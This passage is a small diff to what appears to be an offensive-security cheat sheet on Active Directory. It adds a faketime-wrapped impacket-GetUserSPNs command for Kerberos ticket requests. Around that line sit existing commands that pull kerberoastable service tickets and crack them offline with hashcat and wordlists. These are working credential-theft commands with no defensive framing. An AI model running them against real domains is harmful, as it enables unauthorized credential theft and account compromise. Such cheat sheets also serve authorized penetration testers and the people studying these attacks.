@@ -4134,6 +4134,7 @@ hashcat -m 18200 hashes.asreproast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/h
 
 ```c
 impacket-GetUserSPNs -dc-ip <RHOST> -request <DOMAIN>/<USERNAME>
+faketime 'now + 8 hours'  impacket-GetUserSPNs -dc-ip <RHOST> -request <DOMAIN>/<USERNAME:PASSWORD> -k -dc-ip <IP> -dc-host <FQDN>		// with kerberoast
 hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
